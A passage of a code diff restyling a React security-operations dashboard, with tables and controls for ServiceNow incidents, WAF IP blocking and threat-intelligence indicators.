+                  ServiceNow SIR Incidents
+                </h3>
               </div>
 
-              {loadingIncidents ? (
-                <div className="p-8 text-center text-muted">Loading Security Incidents...</div>
-              ) : incidents.length === 0 ? (
-                <div className="p-8 text-center text-muted">
-                  <ShieldCheck size={36} className="mx-auto mb-2 text-emerald-500 opacity-60" />
-                  <p>No security incidents match the selected filters.</p>
-                </div>
-              ) : (
-                <div className="overflow-x-auto">
-                  <table className="w-full text-left text-xs border-collapse">
-                    <thead>
-                      <tr className="border-b border-border-subtle text-muted uppercase font-semibold">
-                        <th className="py-2.5 px-3">Incident #</th>
-                        <th className="py-2.5 px-3">Title</th>
-                        <th className="py-2.5 px-3">Severity</th>
-                        <th className="py-2.5 px-3">Priority</th>
-                        <th className="py-2.5 px-3">Status</th>
-                        <th className="py-2.5 px-3">Attacker IP</th>
-                        <th className="py-2.5 px-3">Created</th>
-                        <th className="py-2.5 px-3 text-right">Actions</th>
-                      </tr>
-                    </thead>
-                    <tbody className="divide-y divide-border-subtle">
-                      {incidents.map((inc) => (
+              {/* Filters */}
+              <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
+                <select
+                  value={filterIncStatus}
+                  onChange={(e) => setFilterIncStatus(e.target.value)}
+                  style={{
+                    fontSize: '0.78rem',
+                    padding: '0.35rem 0.6rem',
+                    borderRadius: 'var(--radius-sm)',
+                    border: '1px solid var(--border-subtle)',
+                    background: 'var(--bg-primary)',
+                  }}
+                >
+                  <option value="ALL">All Statuses</option>
+                  <option value="NEW">New</option>
+                  <option value="INVESTIGATING">Investigating</option>
+                  <option value="CONTAINED">Contained</option>
+                  <option value="RESOLVED">Resolved</option>
+                </select>
+
+                <select
+                  value={filterIncSeverity}
+                  onChange={(e) => setFilterIncSeverity(e.target.value)}
+                  style={{
+                    fontSize: '0.78rem',
+                    padding: '0.35rem 0.6rem',
+                    borderRadius: 'var(--radius-sm)',
+                    border: '1px solid var(--border-subtle)',
+                    background: 'var(--bg-primary)',
+                  }}
+                >
+                  <option value="ALL">All Severities</option>
+                  <option value="CRITICAL">Critical</option>
+                  <option value="HIGH">High</option>
+                  <option value="MEDIUM">Medium</option>
+                  <option value="LOW">Low</option>
+                </select>
+              </div>
+            </div>
+
+            {loadingIncidents ? (
+              <div style={{ textAlign: 'center', padding: '2.5rem', color: 'var(--text-secondary)' }}>
+                Loading security incidents...
+              </div>
+            ) : incidents.length === 0 ? (
+              <div style={{ textAlign: 'center', padding: '2.5rem', color: 'var(--text-muted)' }}>
+                No incidents reported matching criteria.
+              </div>
+            ) : (
+              <div style={{ overflowX: 'auto' }}>
+                <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '0.825rem' }}>
+                  <thead>
+                    <tr style={{ borderBottom: '1px solid var(--border-subtle)', textAlign: 'left', color: 'var(--text-secondary)' }}>
+                      <th style={{ padding: '0.65rem 0.5rem' }}>Incident ID</th>
+                      <th style={{ padding: '0.65rem 0.5rem' }}>Title</th>
+                      <th style={{ padding: '0.65rem 0.5rem' }}>Severity</th>
+                      <th style={{ padding: '0.65rem 0.5rem' }}>Status</th>
+                      <th style={{ padding: '0.65rem 0.5rem' }}>ServiceNow #</th>
+                      <th style={{ padding: '0.65rem 0.5rem' }}>Action</th>
+                    </tr>
+                  </thead>
+                  <tbody>
+                    {incidents.map((inc) => {
+                      const isSel = selectedIncident?.id === inc.id;
+                      return (
                         <tr
                           key={inc.id}
                           onClick={() => fetchIncidentDetails(inc.id)}
-                          className={`cursor-pointer hover:bg-bg-subtle/40 transition-colors ${
-                            selectedIncident?.id === inc.id ? 'bg-accent-crimson-light/20 font-medium' : ''
-                          }`}
+                          style={{
+                            borderBottom: '1px solid var(--border-subtle)',
+                            cursor: 'pointer',
+                            background: isSel ? 'var(--bg-secondary)' : 'transparent',
+                            transition: 'background var(--transition-fast)',
+                          }}
                         >
-                          <td className="py-3 px-3 font-mono font-bold text-accent-crimson">{inc.id}</td>
-                          <td className="py-3 px-3 max-w-[220px] truncate" title={inc.title}>
+                          <td style={{ padding: '0.65rem 0.5rem', fontFamily: 'monospace', fontWeight: 700, color: 'var(--text-primary)' }}>
+                            {inc.id}
+                          </td>
+                          <td style={{ padding: '0.65rem 0.5rem', fontWeight: 600, color: 'var(--text-primary)', maxWidth: '240px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                             {inc.title}
                           </td>
-                          <td className="py-3 px-3">{getSeverityBadge(inc.severity)}</td>
-                          <td className="py-3 px-3">
-                            <span className="font-mono font-semibold px-2 py-0.5 rounded bg-bg-subtle text-secondary">
-                              {inc.priority}
-                            </span>
+                          <td style={{ padding: '0.65rem 0.5rem' }}>{getSeverityBadge(inc.severity)}</td>
+                          <td style={{ padding: '0.65rem 0.5rem' }}>{getStatusBadge(inc.status)}</td>
+                          <td style={{ padding: '0.65rem 0.5rem', fontFamily: 'monospace', color: 'var(--accent-crimson)', fontWeight: 600 }}>
+                            {inc.servicenow_number || '—'}
                           </td>
-                          <td className="py-3 px-3">{getStatusBadge(inc.status)}</td>
-                          <td className="py-3 px-3 font-mono text-secondary">{inc.source_ip}</td>
-                          <td className="py-3 px-3 text-muted">
-                            {new Date(inc.created_at).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
-                          </td>
-                          <td className="py-3 px-3 text-right">
+                          <td style={{ padding: '0.65rem 0.5rem' }}>
                             <button
                               onClick={(e) => {
                                 e.stopPropagation();
                                 fetchIncidentDetails(inc.id);
                               }}
-                              className="btn-link text-xs flex items-center gap-1 justify-end"
+                              className="btn btn-sm btn-secondary"
+                              style={{ fontSize: '0.72rem', padding: '0.2rem 0.45rem' }}
                             >
-                              Inspect <ChevronRight size={13} />
+                              Inspect
                             </button>
                           </td>
                         </tr>
-                      ))}
-                    </tbody>
-                  </table>
-                </div>
-              )}
-            </div>
+                      );
+                    })}
+                  </tbody>
+                </table>
+              </div>
+            )}
           </div>
 
-          {/* Incident Detail / Investigation Drawer */}
+          {/* Incident Detail Drawer */}
           {selectedIncident && (
-            <div className="lg:col-span-1">
-              <div className="card p-5 rounded-xl border border-accent-crimson/30 bg-card shadow-md sticky top-4">
-                <div className="flex items-center justify-between pb-3 border-b border-border-subtle">
-                  <div>
-                    <span className="text-xs font-mono text-accent-crimson font-bold block">{selectedIncident.id}</span>
-                    <h3 className="text-sm font-bold text-primary mt-0.5">{selectedIncident.title}</h3>
+            <div
+              className="glass-panel"
+              style={{
+                background: '#ffffff',
+                border: '1px solid var(--border-subtle)',
+                borderRadius: 'var(--radius-lg)',
+                padding: '1.25rem',
+                display: 'flex',
+                flexDirection: 'column',
+                justifyContent: 'space-between',
+              }}
+            >
+              <div>
+                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '0.75rem' }}>
+                  <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
+                    <span style={{ fontSize: '1rem', fontWeight: 800, color: 'var(--text-primary)' }}>
+                      {selectedIncident.id}
+                    </span>
+                    {getSeverityBadge(selectedIncident.severity)}
+                    {getStatusBadge(selectedIncident.status)}
                   </div>
                   <button
                     onClick={() => setSelectedIncident(null)}
-                    className="text-muted hover:text-primary text-sm font-bold"
+                    style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--text-muted)' }}
                   >
                     ✕
                   </button>
                 </div>
 
-                <div className="py-3 border-b border-border-subtle flex flex-wrap gap-2 items-center text-xs">
-                  {getSeverityBadge(selectedIncident.severity)}
-                  {getStatusBadge(selectedIncident.status)}
-                  <span className="bg-bg-subtle text-secondary px-2 py-0.5 rounded font-mono">
-                    Priority: {selectedIncident.priority}
-                  </span>
+                <h4 style={{ fontSize: '1.05rem', fontWeight: 700, color: 'var(--text-primary)', marginBottom: '0.5rem' }}>
+                  {selectedIncident.title}
+                </h4>
+                <p style={{ fontSize: '0.825rem', color: 'var(--text-secondary)', lineHeight: 1.5, marginBottom: '1rem', whiteSpace: 'pre-line' }}>
+                  {selectedIncident.description}
+                </p>
+
+                {/* Metadata Grid */}
+                <div
+                  style={{
+                    background: 'var(--bg-primary)',
+                    padding: '0.75rem',
+                    borderRadius: 'var(--radius-md)',
+                    border: '1px solid var(--border-subtle)',
+                    display: 'grid',
+                    gridTemplateColumns: '1fr 1fr',
+                    gap: '0.5rem',
+                    fontSize: '0.78rem',
+                    marginBottom: '1rem',
+                  }}
+                >
+                  <div>
+                    <span style={{ color: 'var(--text-muted)', display: 'block' }}>ServiceNow Ticket:</span>
+                    <strong style={{ color: 'var(--accent-crimson)', fontFamily: 'monospace' }}>
+                      {selectedIncident.servicenow_number || 'N/A'}
+                    </strong>
+                  </div>
+                  <div>
+                    <span style={{ color: 'var(--text-muted)', display: 'block' }}>Source IP:</span>
+                    <strong style={{ fontFamily: 'monospace' }}>{selectedIncident.source_ip || 'N/A'}</strong>
+                  </div>
+                  <div>
+                    <span style={{ color: 'var(--text-muted)', display: 'block' }}>Created At:</span>
+                    <span>{new Date(selectedIncident.created_at).toLocaleString()}</span>
+                  </div>
+                  <div>
+                    <span style={{ color: 'var(--text-muted)', display: 'block' }}>Assigned Analyst:</span>
+                    <strong>{selectedIncident.assigned_to || 'Unassigned'}</strong>
+                  </div>
                 </div>
 
-                <div className="py-3 border-b border-border-subtle text-xs space-y-2">
-                  {selectedIncident.servicenow_number && (
-                    <div className="p-2.5 rounded-lg bg-purple-950/20 border border-purple-500/30 text-xs space-y-1">
-                      <div className="flex items-center justify-between">
-                        <span className="font-bold text-purple-300 flex items-center gap-1.5">
-                          <ExternalLink size={13} />
-                          ServiceNow SIR: {selectedIncident.servicenow_number}
-                        </span>
-                        <span className="text-[10px] font-mono px-1.5 py-0.5 rounded bg-purple-900/50 text-purple-200 border border-purple-600/40">
-                          {selectedIncident.webhook_status || 'DISPATCHED'}
-                        </span>
+                {/* Investigation Work Notes */}
+                <h5 style={{ fontSize: '0.85rem', fontWeight: 700, color: 'var(--text-primary)', marginBottom: '0.5rem' }}>
+                  Investigation Work Notes ({selectedIncident.investigation_notes?.length || 0})
+                </h5>
+                <div
+                  style={{
+                    maxHeight: '180px',
+                    overflowY: 'auto',
+                    border: '1px solid var(--border-subtle)',
+                    borderRadius: 'var(--radius-sm)',
+                    padding: '0.65rem',
+                    background: 'var(--bg-primary)',
+                    marginBottom: '0.75rem',
+                    display: 'flex',
+                    flexDirection: 'column',
+                    gap: '0.5rem',
+                  }}
+                >
+                  {(selectedIncident.investigation_notes || []).map((n, idx) => (
+                    <div key={idx} style={{ fontSize: '0.78rem', borderBottom: '1px dashed var(--border-subtle)', paddingBottom: '0.4rem' }}>
+                      <div style={{ display: 'flex', justifyContent: 'space-between', color: 'var(--text-muted)', fontSize: '0.7rem' }}>
+                        <strong>{n.author}</strong>
+                        <span>{new Date(n.timestamp).toLocaleTimeString()}</span>
                       </div>
-                      <div className="text-[11px] font-mono text-muted">
-                        sys_id: {selectedIncident.servicenow_sys_id || 'sn_sys_external'}
-                      </div>
+                      <div style={{ color: 'var(--text-primary)', marginTop: '0.2rem' }}>{n.text}</div>
                     </div>
-                  )}
-
-                  <div>
-                    <span className="text-muted block">Attacking Source IP:</span>
-                    <span className="font-mono font-bold text-rose-600 text-sm">{selectedIncident.source_ip}</span>
-                  </div>
-                  <div>
-                    <span className="text-muted block">Incident Description:</span>
-                    <p className="text-secondary mt-0.5">{selectedIncident.description}</p>
-                  </div>
+                  ))}
                 </div>
 
-                {/* SOAR Action: Instant Containment */}
-                <div className="py-3 border-b border-border-subtle">
-                  <div className="text-xs font-bold text-primary mb-2 flex items-center gap-1.5">
-                    <Zap size={14} className="text-amber-500" />
-                    <span>SOAR Response Actions</span>
-                  </div>
+                {/* Add Note */}
+                <div style={{ display: 'flex', gap: '0.5rem', marginBottom: '1rem' }}>
+                  <input
+                    type="text"
+                    placeholder="Add work note to incident timeline..."
+                    value={newNote}
+                    onChange={(e) => setNewNote(e.target.value)}
+                    style={{
+                      flex: 1,
+                      padding: '0.4rem 0.65rem',
+                      fontSize: '0.8rem',
+                      borderRadius: 'var(--radius-sm)',
+                      border: '1px solid var(--border-subtle)',
+                    }}
+                  />
                   <button
-                    onClick={handleContainIncident}
-                    disabled={selectedIncident.status === 'CONTAINED' || selectedIncident.status === 'CLOSED'}
-                    className="btn-danger w-full py-2 px-3 text-xs flex items-center justify-center gap-2 rounded-lg font-semibold"
+                    onClick={handleAddIncidentNote}
+                    disabled={savingNote || !newNote.trim()}
+                    className="btn btn-sm btn-primary"
+                    style={{ fontSize: '0.75rem' }}
                   >
-                    <Lock size={14} />
-                    <span>Isolate IP at WAF Gateway</span>
+                    Add
                   </button>
-                  <p className="text-[11px] text-muted mt-1">
-                    Instantly restricts all traffic from {selectedIncident.source_ip} across all API routes.
-                  </p>
                 </div>
+              </div>
 
-                {/* Status Transitions */}
-                <div className="py-3 border-b border-border-subtle">
-                  <label className="text-xs font-bold text-primary block mb-2">ServiceNow State Progression</label>
-                  <div className="grid grid-cols-2 gap-2">
-                    {['INVESTIGATING', 'CONTAINED', 'RESOLVED', 'CLOSED'].map((st) => (
-                      <button
-                        key={st}
-                        onClick={() => handleUpdateIncidentStatus(st)}
-                        disabled={selectedIncident.status === st}
-                        className={`text-xs py-1.5 px-2 rounded-lg border font-medium transition-all ${
-                          selectedIncident.status === st
-                            ? 'bg-accent-crimson text-white border-accent-crimson'
-                            : 'bg-bg-subtle text-secondary hover:border-accent-crimson/40'
-                        }`}
-                      >
-                        {st}
-                      </button>
-                    ))}
-                  </div>
-                </div>
-
-                {/* Investigation Notes Thread */}
-                <div className="py-3">
-                  <div className="text-xs font-bold text-primary mb-2 flex items-center justify-between">
-                    <span>Investigation Thread</span>
-                    <span className="text-muted font-mono">{selectedIncident.investigation_notes?.length || 0}</span>
-                  </div>
-
-                  <div className="max-h-48 overflow-y-auto space-y-2 mb-3 pr-1">
-                    {(selectedIncident.investigation_notes || []).length === 0 ? (
-                      <p className="text-xs text-muted italic">No investigation notes entered yet.</p>
-                    ) : (
-                      selectedIncident.investigation_notes?.map((n) => (
-                        <div key={n.note_id} className="p-2.5 rounded-lg bg-bg-subtle text-xs border border-border-subtle">
-                          <div className="flex items-center justify-between text-muted text-[10px] mb-1">
-                            <span className="font-semibold text-accent-crimson">{n.author}</span>
-                            <span>{new Date(n.timestamp).toLocaleTimeString()}</span>
-                          </div>
-                          <p className="text-secondary leading-snug">{n.text}</p>
-                        </div>
-                      ))
-                    )}
-                  </div>
-
-                  <div className="flex gap-2">
-                    <input
-                      type="text"
-                      placeholder="Add investigation note..."
-                      value={newNote}
-                      onChange={(e) => setNewNote(e.target.value)}
-                      onKeyDown={(e) => e.key === 'Enter' && handleAddIncidentNote()}
-                      className="input-text text-xs flex-1 py-1.5 px-2.5 rounded-lg border border-border-subtle"
-                    />
+              {/* Status Action Buttons */}
+              <div style={{ borderTop: '1px solid var(--border-subtle)', paddingTop: '0.75rem' }}>
+                <span style={{ fontSize: '0.75rem', color: 'var(--text-secondary)', fontWeight: 600, display: 'block', marginBottom: '0.4rem' }}>
+                  Transition Status:
+                </span>
+                <div style={{ display: 'flex', gap: '0.4rem', flexWrap: 'wrap' }}>
+                  {['INVESTIGATING', 'CONTAINED', 'RESOLVED', 'CLOSED'].map((st) => (
                     <button
-                      onClick={handleAddIncidentNote}
-                      disabled={savingNote || !newNote.trim()}
-                      className="btn-primary py-1.5 px-3 text-xs rounded-lg"
+                      key={st}
+                      onClick={() => handleUpdateIncidentStatus(st)}
+                      disabled={selectedIncident.status === st}
+                      className="btn btn-sm btn-secondary"
+                      style={{
+                        fontSize: '0.72rem',
+                        padding: '0.25rem 0.55rem',
+                        opacity: selectedIncident.status === st ? 0.5 : 1,
+                      }}
                     >
-                      <Send size={13} />
+                      {st}
                     </button>
-                  </div>
+                  ))}
                 </div>
               </div>
             </div>
@@ -952,130 +1256,104 @@ export const SecOpsPage: React.FC = () => {
         </div>
       )}
 
-      {/* TAB 2: IP THREAT MONITOR & WAF CONTROLS */}
+      {/* TAB 2: WAF IP CONTAINMENT */}
       {activeTab === 'waf_ips' && (
-        <div className="card p-5 rounded-xl border border-border-subtle bg-card shadow-sm">
-          <div className="flex flex-wrap items-center justify-between gap-3 mb-5">
-            <div>
-              <h2 className="text-base font-bold text-primary">IP Threat Monitoring & WAF Restrictions</h2>
-              <p className="text-xs text-muted mt-0.5">
-                Dynamic and manual IP blocking enforced at the gateway middleware layer with trusted proxy resolution.
-              </p>
+        <div className="glass-panel" style={{ background: '#ffffff', border: '1px solid var(--border-subtle)', padding: '1.25rem' }}>
+          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '1rem', flexWrap: 'wrap', gap: '0.75rem' }}>
+            <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
+              <Lock size={18} color="#c2410c" />
+              <h3 style={{ fontSize: '1.05rem', fontWeight: 800, color: 'var(--text-primary)' }}>
+                Dynamic IP Threat Tracking & WAF Containment
+              </h3>
             </div>
 
-            <div className="flex items-center gap-3">
+            <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
               <select
                 value={filterIpStatus}
                 onChange={(e) => setFilterIpStatus(e.target.value)}
-                className="input-select text-xs py-1.5 px-2.5 rounded-lg border border-border-subtle"
-                aria-label="Filter IP Status"
+                style={{
+                  fontSize: '0.78rem',
+                  padding: '0.35rem 0.6rem',
+                  borderRadius: 'var(--radius-sm)',
+                  border: '1px solid var(--border-subtle)',
+                  background: 'var(--bg-primary)',
+                }}
               >
-                <option value="ALL">All IP States</option>
+                <option value="ALL">All States</option>
                 <option value="PERM_BLOCKED">Permanently Blocked</option>
                 <option value="TEMP_BLOCKED">Temporarily Blocked</option>
                 <option value="FLAGGED">Flagged</option>
                 <option value="ALLOWLISTED">Allowlisted</option>
-                <option value="CLEAN">Clean</option>
               </select>
-
-              <button
-                onClick={() => setBlockIpModal({ open: true, ip: '', isPerm: false })}
-                className="btn-danger flex items-center gap-1.5 text-xs py-2 px-3 rounded-lg font-semibold"
-              >
-                <Lock size={14} />
-                <span>Manual Block IP</span>
-              </button>
             </div>
           </div>
 
           {loadingIps ? (
-            <div className="p-8 text-center text-muted">Loading IP Reputations...</div>
+            <div style={{ textAlign: 'center', padding: '2.5rem', color: 'var(--text-secondary)' }}>
+              Loading IP reputation table...
+            </div>
           ) : ipReputations.length === 0 ? (
-            <div className="p-8 text-center text-muted">
-              <ShieldCheck size={36} className="mx-auto mb-2 text-emerald-500 opacity-60" />
-              <p>No tracked IP records found for this filter.</p>
+            <div style={{ textAlign: 'center', padding: '2.5rem', color: 'var(--text-muted)' }}>
+              No IP tracking records matching criteria.
             </div>
           ) : (
-            <div className="overflow-x-auto">
-              <table className="w-full text-left text-xs border-collapse">
+            <div style={{ overflowX: 'auto' }}>
+              <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '0.825rem' }}>
                 <thead>
-                  <tr className="border-b border-border-subtle text-muted uppercase font-semibold">
-                    <th className="py-2.5 px-3">IP Address</th>
-                    <th className="py-2.5 px-3">WAF Status</th>
-                    <th className="py-2.5 px-3">Risk Score</th>
-                    <th className="py-2.5 px-3">Malicious Attempts</th>
-                    <th className="py-2.5 px-3">Block Expiry</th>
-                    <th className="py-2.5 px-3">Reason / Details</th>
-                    <th className="py-2.5 px-3">Override</th>
-                    <th className="py-2.5 px-3 text-right">Actions</th>
+                  <tr style={{ borderBottom: '1px solid var(--border-subtle)', textAlign: 'left', color: 'var(--text-secondary)' }}>
+                    <th style={{ padding: '0.65rem 0.5rem' }}>IP Address</th>
+                    <th style={{ padding: '0.65rem 0.5rem' }}>Status</th>
+                    <th style={{ padding: '0.65rem 0.5rem' }}>Risk Score</th>
+                    <th style={{ padding: '0.65rem 0.5rem' }}>Violations</th>
+                    <th style={{ padding: '0.65rem 0.5rem' }}>Last Seen</th>
+                    <th style={{ padding: '0.65rem 0.5rem' }}>Reason</th>
+                    <th style={{ padding: '0.65rem 0.5rem' }}>Enforcement Actions</th>
                   </tr>
                 </thead>
-                <tbody className="divide-y divide-border-subtle">
+                <tbody>
                   {ipReputations.map((rep) => (
-                    <tr key={rep.ip} className="hover:bg-bg-subtle/30 transition-colors">
-                      <td className="py-3 px-3 font-mono font-bold text-primary">{rep.ip}</td>
-                      <td className="py-3 px-3">{getIpStatusBadge(rep.status)}</td>
-                      <td className="py-3 px-3">
-                        <div className="flex items-center gap-2">
-                          <div className="w-16 bg-bg-subtle rounded-full h-2 overflow-hidden">
-                            <div
-                              className={`h-full ${
-                                rep.risk_score >= 80
-                                  ? 'bg-rose-600'
-                                  : rep.risk_score >= 40
-                                  ? 'bg-amber-500'
-                                  : 'bg-emerald-500'
-                              }`}
-                              style={{ width: `${Math.min(rep.risk_score, 100)}%` }}
-                            />
-                          </div>
-                          <span className="font-mono text-[11px] text-muted">{rep.risk_score}</span>
-                        </div>
+                    <tr key={rep.ip} style={{ borderBottom: '1px solid var(--border-subtle)' }}>
+                      <td style={{ padding: '0.65rem 0.5rem', fontFamily: 'monospace', fontWeight: 700, color: 'var(--text-primary)' }}>
+                        {rep.ip}
                       </td>
-                      <td className="py-3 px-3 font-mono font-bold text-rose-600">{rep.malicious_attempts}</td>
-                      <td className="py-3 px-3 text-muted">
-                        {rep.blocked_until ? new Date(rep.blocked_until).toLocaleTimeString() : '—'}
+                      <td style={{ padding: '0.65rem 0.5rem' }}>{getIpStatusBadge(rep.status)}</td>
+                      <td style={{ padding: '0.65rem 0.5rem', fontWeight: 700, color: rep.risk_score > 60 ? '#b91c1c' : '#b45309' }}>
+                        {rep.risk_score} / 100
                       </td>
-                      <td className="py-3 px-3 max-w-[200px] truncate text-secondary" title={rep.block_reason || ''}>
-                        {rep.block_reason || 'Standard inspection'}
+                      <td style={{ padding: '0.65rem 0.5rem', fontWeight: 600 }}>{rep.malicious_attempts}</td>
+                      <td style={{ padding: '0.65rem 0.5rem', color: 'var(--text-secondary)' }}>
+                        {new Date(rep.last_seen_at).toLocaleTimeString()}
                       </td>
-                      <td className="py-3 px-3">
-                        {rep.manual_override ? (
-                          <span className="text-[10px] bg-amber-900/40 text-amber-300 border border-amber-500/40 px-1.5 py-0.5 rounded font-mono">
-                            Admin
-                          </span>
-                        ) : (
-                          <span className="text-[10px] text-muted font-mono">Auto</span>
-                        )}
+                      <td style={{ padding: '0.65rem 0.5rem', color: 'var(--text-muted)', maxWidth: '200px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
+                        {rep.block_reason || '—'}
                       </td>
-                      <td className="py-3 px-3 text-right space-x-2">
-                        {rep.status === 'PERM_BLOCKED' || rep.status === 'TEMP_BLOCKED' ? (
-                          <button
-                            onClick={() => handleUnblockIp(rep.ip)}
-                            className="btn-link text-emerald-600 hover:text-emerald-500 text-xs inline-flex items-center gap-1"
-                          >
-                            <Unlock size={12} />
-                            Unblock
-                          </button>
-                        ) : (
-                          <button
-                            onClick={() => setBlockIpModal({ open: true, ip: rep.ip, isPerm: false })}
-                            className="btn-link text-rose-600 hover:text-rose-500 text-xs inline-flex items-center gap-1"
-                          >
-                            <Lock size={12} />
-                            Block
-                          </button>
-                        )}
-
-                        {rep.status !== 'ALLOWLISTED' && (
+                      <td style={{ padding: '0.65rem 0.5rem' }}>
+                        <div style={{ display: 'flex', gap: '0.35rem' }}>
+                          {rep.status.includes('BLOCKED') ? (
+                            <button
+                              onClick={() => handleUnblockIp(rep.ip)}
+                              className="btn btn-sm btn-secondary"
+                              style={{ fontSize: '0.72rem', padding: '0.2rem 0.45rem', color: '#15803d' }}
+                            >
+                              Unblock
+                            </button>
+                          ) : (
+                            <button
+                              onClick={() => setBlockIpModal({ open: true, ip: rep.ip, isPerm: false })}
+                              className="btn btn-sm btn-secondary"
+                              style={{ fontSize: '0.72rem', padding: '0.2rem 0.45rem', color: '#b91c1c' }}
+                            >
+                              Block IP
+                            </button>
+                          )}
                           <button
                             onClick={() => handleAllowlistIp(rep.ip)}
-                            className="btn-link text-blue-600 hover:text-blue-500 text-xs inline-flex items-center gap-1"
+                            className="btn btn-sm btn-secondary"
+                            style={{ fontSize: '0.72rem', padding: '0.2rem 0.45rem' }}
                           >
-                            <ShieldCheck size={12} />
                             Allowlist
                           </button>
-                        )}
+                        </div>
                       </td>
                     </tr>
                   ))}
@@ -1088,64 +1366,60 @@ export const SecOpsPage: React.FC = () => {
 
       {/* TAB 3: THREAT INTELLIGENCE (TISC) */}
       {activeTab === 'threat_intel' && (
-        <div className="card p-5 rounded-xl border border-border-subtle bg-card shadow-sm">
-          <div className="flex flex-wrap items-center justify-between gap-3 mb-5">
-            <div>
-              <h2 className="text-base font-bold text-primary">External Threat Intelligence Feeds (IoCs)</h2>
-              <p className="text-xs text-muted mt-0.5">
-                ServiceNow Threat Intelligence Security Center (TISC) indicator repository for real-time request enrichment.
-              </p>
+        <div className="glass-panel" style={{ background: '#ffffff', border: '1px solid var(--border-subtle)', padding: '1.25rem' }}>
+          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '1rem', flexWrap: 'wrap', gap: '0.75rem' }}>
+            <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
+              <Radio size={18} color="#7c3aed" />
+              <h3 style={{ fontSize: '1.05rem', fontWeight: 800, color: 'var(--text-primary)' }}>
+                Threat Intelligence Indicators (TISC)
+              </h3>
             </div>
 
             <button
               onClick={() => setNewIocModal(true)}
-              className="btn-primary flex items-center gap-1.5 text-xs py-2 px-3 rounded-lg font-semibold"
+              className="btn btn-sm btn-primary"
+              style={{ display: 'flex', alignItems: 'center', gap: '0.35rem', fontSize: '0.78rem' }}
             >
               <Plus size={14} />
-              <span>Add Indicator (IoC)</span>
+              <span>Add IOC Indicator</span>
             </button>
           </div>
 
           {loadingTi ? (
-            <div className="p-8 text-center text-muted">Loading Threat Indicators...</div>
+            <div style={{ textAlign: 'center', padding: '2.5rem', color: 'var(--text-secondary)' }}>
+              Loading threat intelligence indicators...
+            </div>
+          ) : threatIntel.length === 0 ? (
+            <div style={{ textAlign: 'center', padding: '2.5rem', color: 'var(--text-muted)' }}>
+              No threat intelligence indicators active.
+            </div>
           ) : (
-            <div className="overflow-x-auto">
-              <table className="w-full text-left text-xs border-collapse">
+            <div style={{ overflowX: 'auto' }}>
+              <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '0.825rem' }}>
                 <thead>
-                  <tr className="border-b border-border-subtle text-muted uppercase font-semibold">
-                    <th className="py-2.5 px-3">Type</th>
-                    <th className="py-2.5 px-3">Indicator Value</th>
-                    <th className="py-2.5 px-3">Threat Actor</th>
-                    <th className="py-2.5 px-3">Campaign</th>
-                    <th className="py-2.5 px-3">Confidence</th>
-                    <th className="py-2.5 px-3">Description</th>
-                    <th className="py-2.5 px-3">Added</th>
+                  <tr style={{ borderBottom: '1px solid var(--border-subtle)', textAlign: 'left', color: 'var(--text-secondary)' }}>
+                    <th style={{ padding: '0.65rem 0.5rem' }}>Type</th>
+                    <th style={{ padding: '0.65rem 0.5rem' }}>Indicator Value</th>
+                    <th style={{ padding: '0.65rem 0.5rem' }}>Threat Actor</th>
+                    <th style={{ padding: '0.65rem 0.5rem' }}>Campaign</th>
+                    <th style={{ padding: '0.65rem 0.5rem' }}>Confidence</th>
+                    <th style={{ padding: '0.65rem 0.5rem' }}>Description</th>
                   </tr>
                 </thead>
-                <tbody className="divide-y divide-border-subtle">
+                <tbody>
                   {threatIntel.map((ti) => (
-                    <tr key={ti.id} className="hover:bg-bg-subtle/30 transition-colors">
-                      <td className="py-3 px-3">
-                        <span className="font-mono text-[10px] px-2 py-0.5 rounded bg-bg-subtle text-secondary font-bold">
-                          {ti.type}
-                        </span>
+                    <tr key={ti.id} style={{ borderBottom: '1px solid var(--border-subtle)' }}>
+                      <td style={{ padding: '0.65rem 0.5rem', fontWeight: 700, color: '#7c3aed' }}>{ti.type}</td>
+                      <td style={{ padding: '0.65rem 0.5rem', fontFamily: 'monospace', fontWeight: 600, color: 'var(--text-primary)' }}>
+                        {ti.value}
                       </td>
-                      <td className="py-3 px-3 font-mono font-bold text-rose-600">{ti.value}</td>
-                      <td className="py-3 px-3 font-medium text-primary">{ti.threat_actor || 'Unknown Group'}</td>
-                      <td className="py-3 px-3 text-secondary">{ti.campaign || 'General Exploitation'}</td>
-                      <td className="py-3 px-3">
-                        <div className="flex items-center gap-2">
-                          <div className="w-14 bg-bg-subtle rounded-full h-2 overflow-hidden">
-                            <div className="h-full bg-rose-600" style={{ width: `${ti.confidence}%` }} />
-                          </div>
-                          <span className="font-mono text-[11px] text-muted">{ti.confidence}%</span>
-                        </div>
+                      <td style={{ padding: '0.65rem 0.5rem', fontWeight: 600 }}>{ti.threat_actor || 'Unknown'}</td>
+                      <td style={{ padding: '0.65rem 0.5rem', color: 'var(--text-secondary)' }}>{ti.campaign || 'General'}</td>
+                      <td style={{ padding: '0.65rem 0.5rem', fontWeight: 700, color: ti.confidence > 80 ? '#b91c1c' : '#b45309' }}>
+                        {ti.confidence}%
                       </td>
-                      <td className="py-3 px-3 max-w-[280px] truncate text-muted" title={ti.description}>
+                      <td style={{ padding: '0.65rem 0.5rem', color: 'var(--text-secondary)', maxWidth: '280px' }}>
                         {ti.description}
-                      </td>
-                      <td className="py-3 px-3 text-muted">
-                        {new Date(ti.added_at).toLocaleDateString()}
                       </td>
                     </tr>
                   ))}
@@ -1156,126 +1430,117 @@ export const SecOpsPage: React.FC = () => {
         </div>
       )}
 
-      {/* TAB 4: WAF SECURITY HISTORY & AUDIT */}
+      {/* TAB 4: SECURITY AUDIT LOG */}
       {activeTab === 'audit_events' && (
-        <div className="card p-5 rounded-xl border border-border-subtle bg-card shadow-sm">
